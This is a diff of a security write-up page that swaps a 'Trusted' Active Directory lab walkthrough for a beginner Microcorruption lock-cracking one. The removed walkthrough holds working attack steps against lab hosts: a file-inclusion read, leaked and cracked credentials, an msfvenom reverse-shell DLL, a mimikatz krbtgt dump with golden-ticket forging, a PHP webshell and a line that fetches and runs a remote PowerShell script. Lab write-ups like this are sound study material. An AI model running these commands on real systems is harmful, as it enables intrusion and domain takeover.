@@ -9,26 +9,24 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Trusted</title>
-    <meta name="title" content="Trusted">
-    <meta name="description" content="IPs: 10.10.217.117 10.10.217.118">
+    <title>1. New Orleans</title>
+    <meta name="title" content="1. New Orleans">
+    <meta name="description" content="When running the module it asks for a password:">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/trusted/">
+    <link rel="canonical" href="https://eljayright.github.io/writeups/microcorruption/1-new-orleans/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="og:title" content="Trusted">
-    <meta property="og:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/microcorruption/1-new-orleans/">
+    <meta property="og:title" content="1. New Orleans">
+    <meta property="og:description" content="When running the module it asks for a password:">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="twitter:title" content="Trusted">
-    <meta property="twitter:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/microcorruption/1-new-orleans/">
+    <meta property="twitter:title" content="1. New Orleans">
+    <meta property="twitter:description" content="When running the module it asks for a password:">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
@@ -179,272 +177,90 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="trusted" class="break-words">
+<doc-anchor-target id="1-new-orleans" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#trusted">#</doc-anchor-trigger>
-        <span>Trusted</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#1-new-orleans">#</doc-anchor-trigger>
+        <span>1. New Orleans</span>
     </h1>
 </doc-anchor-target>
-<p><figure class="content-center">
-    <img src="images/trusted.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>IPs: <code v-pre>10.10.217.117</code> <code v-pre>10.10.217.118</code></p>
-<doc-anchor-target id="recon">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
-        <span>Recon</span>
-    </h1>
+<doc-anchor-target id="challenge-overview">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#challenge-overview">#</doc-anchor-trigger>
+        <span>Challenge Overview</span>
+    </h2>
 </doc-anchor-target>
-<p>Nmap:
-10.10.217.117 trusteddc.trusted.vl</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:29Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">OVERVIEW
+
+    - This is the first LockIT Pro Lock.
+    - This lock is not attached to any hardware security module.</code></pre>
 </doc-codeblock></div>
-<p>10.10.217.118 labdc.lab.trusted.vl</p>
+<p>When running the module it asks for a password:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:18Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3306/tcp open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Enter the password to continue
+&gt; password
+Invalid password; try again.</code></pre>
 </doc-codeblock></div>
-<p>Seems to be a parent and child domain which will be interesting.</p>
-<p>Checking port 80 shows that xampp <code v-pre>XAMPP for Windows 8.1.6</code> is running, this has a webdav exploit <a href="https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit">https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit</a> but the endpoint doesn&#x27;t seem to exist.</p>
-<p>Fuzzing with <code v-pre>ffuf</code> shows a <code v-pre>/dev</code> endpoint:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.217.118/FUZZ
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.10.217.118/FUZZ
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-...snip...
-dev                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 283ms]</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="foothold">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
-        <span>Foothold</span>
-    </h1>
+<doc-anchor-target id="solution">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#solution">#</doc-anchor-trigger>
+        <span>Solution</span>
+    </h2>
 </doc-anchor-target>
-<p>On the main page there is a note:</p>
+<p>Looking at the disassembly:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">Eric please take a look at this if you have the time. I tried to implement some php code and set up the database connection but it doesn't seem to work. Could you fix it please?</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">4438 &lt;main&gt;
+4438:  3150 9cff      add	#0xff9c, sp
+443c:  b012 7e44      call	#0x447e &lt;create_password&gt;
+4440:  3f40 e444      mov	#0x44e4 &quot;Enter the password to continue&quot;, r15
+4444:  b012 9445      call	#0x4594 &lt;puts&gt;
+4448:  0f41           mov	sp, r15
+444a:  b012 b244      call	#0x44b2 &lt;get_password&gt;
+444e:  0f41           mov	sp, r15
+4450:  b012 bc44      call	#0x44bc &lt;check_password&gt;
+4454:  0f93           tst	r15
+4456:  0520           jnz	$+0xc &lt;main+0x2a&gt;
+4458:  3f40 0345      mov	#0x4503 &quot;Invalid password; try again.&quot;, r15
+445c:  b012 9445      call	#0x4594 &lt;puts&gt;
+4460:  063c           jmp	$+0xe &lt;main+0x36&gt;
+4462:  3f40 2045      mov	#0x4520 &quot;Access Granted!&quot;, r15
+4466:  b012 9445      call	#0x4594 &lt;puts&gt;
+446a:  b012 d644      call	#0x44d6 &lt;unlock_door&gt;
+446e:  0f43           clr	r15
+4470:  3150 6400      add	#0x64, sp
+---
+44bc &lt;check_password&gt;
+44bc:  0e43           clr	r14
+44be:  0d4f           mov	r15, r13
+44c0:  0d5e           add	r14, r13
+44c2:  ee9d 0024      cmp.b	@r13, 0x2400(r14)
+44c6:  0520           jnz	$+0xc &lt;check_password+0x16&gt;
+44c8:  1e53           inc	r14
+44ca:  3e92           cmp	#0x8, r14
+44cc:  f823           jnz	$-0xe &lt;check_password+0x2&gt;
+44ce:  1f43           mov	#0x1, r15
+44d0:  3041           ret
+44d2:  0f43           clr	r15
+44d4:  3041           ret</code></pre>
 </doc-codeblock></div>
-<p>The URI path for the website also looks very interesting:</p>
+<p>We can see that there is a check against @r13 and 0x2400. Setting a breakpoint and inspecting the memory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=index.html</code></pre>
-</doc-codeblock></div>
-<p>Using this we are able to read arb files:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\Windows\System32\drivers\etc\hosts
+<pre translate="no" class="language-none"><code v-pre class="language-none">&gt; r r13
+439c 7061 7373 776f 7264 0000 0000 0000 0000  password........
+43ac 0000 0000 0000 0000 0000 0000 0000 0000  ................
 
-IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=</code></pre>
+&gt; r 0x2400+r14
+2400 4363 5e33 4050 2700 0000 0000 0000 0000  Cc^3@P'.........
+2410 0000 0000 0000 0000 0000 0000 0000 0000  ................</code></pre>
 </doc-codeblock></div>
-<p>Fuzzing again shows a file called <code v-pre>db.php</code></p>
+<p>r13 is our input.
+Swapping this to the expected value of <code v-pre>Cc^3@P'</code> and removing the breakpoint.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u 'https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php' -fw 55
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response words: 55
-________________________________________________
-
-db                      [Status: 200, Size: 1109, Words: 25, Lines: 31, Duration: 286ms]</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Enter the password to continue
+&gt; Cc^3@P'
+Access Granted!</code></pre>
 </doc-codeblock></div>
-<p>Which has db creds:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">&lt;?php 
-$servername = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;SuperSecureMySQLPassw0rd1337.&quot;;
-
-$conn = mysqli_connect($servername, $username, $password);
-
-if (!$conn) {
-  die(&quot;Connection failed: &quot; . mysqli_connect_error());
-}
-echo &quot;Connected successfully&quot;;</code></pre>
-</doc-codeblock></div>
-<p>Logging into the db gives creds!</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">+--------------+----------------------------------+
-| short_handle | password                         |
-+--------------+----------------------------------+
-| rsmith       | 7e7abb54bbef42f0fbfa3007b368def7 |
-| ewalters     | d6e81aeb4df9325b502a02f11043e0ad |
-| cpowers      | e3d3eb0f46fe5d75eed8d11d54045a60 |
-+--------------+----------------------------------+</code></pre>
-</doc-codeblock></div>
-<p>Throwing these in hashcat gives:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">rsmith:IHateEric2</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="lateral-movement-to-ewalters">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#lateral-movement-to-ewalters">#</doc-anchor-trigger>
-        <span>Lateral movement to ewalters</span>
-    </h1>
-</doc-anchor-target>
-<p>Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.</p>
-<p>Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">rpcclient -U 'rsmith' //labdc.lab.trusted.vl
-Can't load /etc/samba/smb.conf - run testparm to debug it
-Password for [WORKGROUP\rsmith]:
-rpcclient $&gt; setuserinfo2 ewalters 23 SecurePassword123@
-</code></pre>
-</doc-codeblock></div>
-<p>Then checking that it is set.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">nxc winrm labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-WINRM       10.10.217.118   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
-WINRM       10.10.217.118   5985   LABDC            [+] lab.trusted.vl\ewalters:SecurePassword123@ (Pwn3d!)</code></pre>
-</doc-codeblock></div>
-<p>Nice! We can also login with winrm</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">evil-winrm -i labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\ewalters\Documents&gt; </code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="dll-hijack-to-da">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-hijack-to-da">#</doc-anchor-trigger>
-        <span>DLL Hijack to DA</span>
-    </h1>
-</doc-anchor-target>
-<p>Looking around there is an AVTest directory with two files:
-<code v-pre>kasperskyremovaltool.exe</code> and <code v-pre>readme.txt</code></p>
-<p>The note mentions another user is expected to run this program:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
-I asked Christine to run them a few times, just to be sure.
-
-Let's just hope we don't have to set this lab up again because of this.</code></pre>
-</doc-codeblock></div>
-<p>A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)</p>
-<p>To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.</p>
-<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>
-<p>Do this you will see that the application tries to load <code v-pre>KasperskyRemovalToolENU.dll</code> a few times.
-So if we make a dll and call it <code v-pre>KasperskyRemovalToolENU.dll</code> and place it in the same location as the <code v-pre>kasperskyremovaltool.exe</code> we will get a shell.</p>
-<p>Being lazy and using msfvenom:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f dll -o KasperskyRemovalToolENU.dll</code></pre>
-</doc-codeblock></div>
-<p>Uploading the file and waiting a bit we get a shell as <code v-pre>cpowers</code> that happens to be a domain admin on the machine.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">whoami /groups
-
-GROUP INFORMATION
------------------
-... snip ...
-BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
-LAB\Domain Admins                          Group            S-1-5-21-2241985869-2159962460-1278545866-512 Mandatory group, Enabled by default, Enabled group             
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="forest-privesc">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#forest-privesc">#</doc-anchor-trigger>
-        <span>Forest Privesc</span>
-    </h1>
-</doc-anchor-target>
-<p>Going back to bloodhound shows that there is a parent domain called <code v-pre>trusted.vl</code> to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for <code v-pre>lab.trusted.vl</code> and forge a golden ticket.
-To get this we can just do a dcsync on the dc with mimikatz.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;
-..snip..
-User : krbtgt
-LM   : 
-NTLM : c7a03c565c68c6fac5f8913fab576ebd</code></pre>
-</doc-codeblock></div>
-<p>We also need the domain sid of both domains, both available from bloodhound.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">lab.trusted.vl S-1-5-21-2241985869-2159962460-1278545866
-trusted.vl S-1-5-21-3576695518-347000760-3731839591</code></pre>
-</doc-codeblock></div>
-<p>We can use the default Enterprise Admin groups SID being &lt;domain_sid&gt;-519</p>
-<p>Now to form the ticket:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">ticketer.py -nthash c7a03c565c68c6fac5f8913fab576ebd -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</code></pre>
-</doc-codeblock></div>
-<p>Then login with psexec:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Windows\system32&gt; whoami
-nt authority\system
-
-C:\Windows\system32&gt; hostname
-trusteddc</code></pre>
-</doc-codeblock></div>
-<p>:D !</p>
-<doc-anchor-target id="beyond-root">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#beyond-root">#</doc-anchor-trigger>
-        <span>Beyond Root</span>
-    </h1>
-</doc-anchor-target>
-<p>Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho.</p>
-<p>You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">select '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' into outfile &quot;C:\\xampp\\htdocs\\dev\\webshell.php&quot;;</code></pre>
-</doc-codeblock></div>
-<p>Then you can just <code v-pre>iex(iwr http://server/file.ps1)</code> to get a revshell.</p>
+<p>Nice warmup to learn the env and how the asm works.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -454,16 +270,23 @@ trusteddc</code></pre>
                             
                                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/tengu/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/htb/anubis/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Tengu</span>
+                                                <span class="block mt-1">Anubis</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/microcorruption/2-sydney/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">2. Sydney</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
                                     </div>
                                 </nav>
                             </footer>
@@ -504,6 +327,6 @@ trusteddc</code></pre>
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Trusted", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "1. New Orleans", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
